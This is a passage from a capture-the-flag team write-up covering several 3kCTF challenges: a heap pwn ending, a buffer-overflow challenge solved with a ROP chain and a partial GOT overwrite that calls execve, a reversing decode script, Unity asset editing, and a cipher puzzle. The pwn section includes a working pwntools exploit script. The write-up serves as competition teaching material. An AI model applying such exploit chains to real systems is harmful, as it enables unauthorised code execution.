Finally, we perform fastbin attack to control &lt;code&gt;pages&lt;/code&gt; and &lt;code&gt;check_pages&lt;/code&gt;, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;3k{unlink_the_world_and_feel_the_void}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;one-and-a-half-man-pwn-493-points&#34;&gt;one and a half man (Pwn; 493 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;program-1&#34;&gt;Program&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#a6e22e&#34;&gt;vuln&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+6h] [rbp-Ah]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAAuLL&lt;/span&gt;);
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is a short function that obviously vulnerable to buffer overflow.
I have solved similar challenge before, and my approach was to overwrite first 2 byte the &lt;code&gt;read_got&lt;/code&gt; to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it.
&lt;strong&gt;It works&lt;/strong&gt;, but &lt;code&gt;can&#39;t access tty; job control turned off&lt;/code&gt;. Okay, I shouldn&#39;t forgot shell interaction is disabled from this server.&lt;/p&gt;

&lt;h3 id=&#34;exploit-2&#34;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;I find a &lt;code&gt;syscall&lt;/code&gt; near the one gadget RCE so that we can jump to syscalls. It&#39;s time to construct ROP:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov eax, 0 ; pop rbp ; ret           g1(in binary)
mov edx, eax ; mov eax, edx ; ret      (in libc)
pop rdi; ret                           (in binary)
pop rsi; pop r15; ret                  (in binary)
move eax, 0x3b; syscall                (in libc)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By this ROP chain we can set &lt;code&gt;edx&lt;/code&gt; (the third argument) to 0, control &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;rsi&lt;/code&gt; (the first and the second arguments) and call &lt;code&gt;sys_execve&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;sys_execve(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filename, argv[], envp[])&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To &lt;code&gt;cat flag&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;sys_execve(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cat&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cat&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;flag&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally our script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flat(pop_rsi_r15, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt, vuln)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(payload)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/cat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(buf)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(buf&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;) \
            &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(string)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)

payload2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flat(pop_rsi_r15, setvbuf_got, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt, pop_rsi_r15, read_got, \
                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \
                buf&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, read_plt)
                ret
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload2)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x5b\xd6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# (in libc) mov edx, eax ; mov eax, edx ; ret&lt;/span&gt;
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x72\x04&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# (in libc) move eax, 0x3b; syscall&lt;/span&gt;
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;3k{one_byte_and_a_half_overwrite_ftw!}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;microscopic-reverse-488-points&#34;&gt;microscopic (Reverse; 488 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Open with IDA pro. There is a curious function defined on &lt;code&gt;sub_F7C&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_F7C&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// v3 hereby is the length of the length of the target ciphertext
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ciphertext[v2] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; input[v12]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2;
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ciphertext[v12] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; target_ciphertext[v12];
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hereby &lt;code&gt;target_ciphertext&lt;/code&gt; is is an array of 39 integers, located on &lt;code&gt;0x202020&lt;/code&gt;. We can simply write a Python script that extract &lt;code&gt;target_ciphertext&lt;/code&gt; and compute the corresponding input.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/micro&amp;#39;&lt;/span&gt;)
target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x202020&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I&amp;#39;&lt;/span&gt;, target[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;)]

target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(c&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i)&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(target)]
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(bytes(target))
&lt;span style=&#34;color:#75715e&#34;&gt;# 3k{nan0mites_everywhere_everytime_ftw!}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;game-reversemisc-486477-points&#34;&gt;game (Reverse/Misc; 486+477 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;eriri&lt;/em&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;game 1
find your way to the heart of the maze

game 2
the shortest route is often the best&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.&lt;/p&gt;

&lt;p&gt;I think there should be multiple ways to solve the challenge. One solution will be &lt;em&gt;physcially&lt;/em&gt; break the maze. How to do that? By deleting the walls object in the level.&lt;/p&gt;

&lt;p&gt;With &lt;a href=&#34;https://github.com/DerPopo/UABE&#34;&gt;Unity Assets Bundle Extractor&lt;/a&gt;, we are able to delete walls in &lt;code&gt;/CTF_Data/level0&lt;/code&gt; (which is level of the maze).
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/1qIvga0.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;After deleting some of the wall objects (for me I selected the &lt;code&gt;GameObject Wall&lt;/code&gt; with number greater than 100) and returning to the game, you will find a wall that marks the flag for &lt;code&gt;game 2&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/CijVLag.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;There are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: &lt;code&gt;3K-CTF-A-MAZE-ING&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There are also some &lt;em&gt;floating&lt;/em&gt; walls inside the maze. When you walk through it you will get a word overlayed on the top left corner.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/AanPBXV.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Decompiling &lt;code&gt;/CTF_Data/Managed/Assembly-CSharp.dll&lt;/code&gt; will get you the logic of the game.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/AwL6Bub.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;
If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/jnBf3T6.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Here in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/uHAzYbC.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;After some tries (with a bit of luck), we were able to get the flag for &lt;code&gt;game 1&lt;/code&gt;.
&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/cgF7eDj.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Flag: &lt;code&gt;3K-CTF-GamingIsNotACrime&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Reference: &lt;a href=&#34;https://github.com/imadr/Unity-game-hacking&#34;&gt;https://github.com/imadr/Unity-game-hacking&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;pyzzle-reversemisccrypto-459479-points&#34;&gt;pyzzle (Reverse/Misc/Crypto; 459+479 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;crabmony&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;part-1&#34;&gt;Part 1&lt;/h3&gt;

&lt;p&gt;We are given a concrete syntax tree that is from &lt;a href=&#34;https://github.com/Instagram/LibCST&#34;&gt;LibCST&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; binascii

plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REDACTED&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exor&lt;/span&gt;(a, b):
    temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; b[i]:
            temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; temp

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BinaryToDecimal&lt;/span&gt;(binary):
    string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(binary, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; string

PT_Ascii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ord(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; plaintext]
PT_Bin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [format(y, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;08b&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; PT_Ascii]
PT_Bin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(PT_Bin)
n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26936&lt;/span&gt;
K1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Redacted as this binary string is too long.&lt;/span&gt;
K2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Ditto&lt;/span&gt;
L1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PT_Bin[:n]
R1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PT_Bin[n:]
f1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(R1,K1)
R2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(f1, L1)
L2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; R1
f2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(R2, K2)
R3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exor(f2, L2)
L3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; R2
R3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Ditto&lt;/span&gt;
L3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Ditto&lt;/span&gt;
cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; R3
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; R6
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(plaintext, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unhexlify(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; plaintext)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(plaintext)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: &lt;code&gt;3k{almost_done_shizzle_up_my_nizzle}&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;part-2&#34;&gt;Part 2&lt;/h3&gt;

&lt;p&gt;From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse_line&lt;/span&gt;(line):
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; list(map(int, line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pyzzle2&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    lines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  
  edges &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(parse_line, lines[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;]))
  points &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(parse_line, lines[&lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;271&lt;/span&gt;]))
  point_map &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; id, x, y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; points:
    point_map[id] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (x, y)

  im &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#ae81ff&#34;&gt;1850&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;), color&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
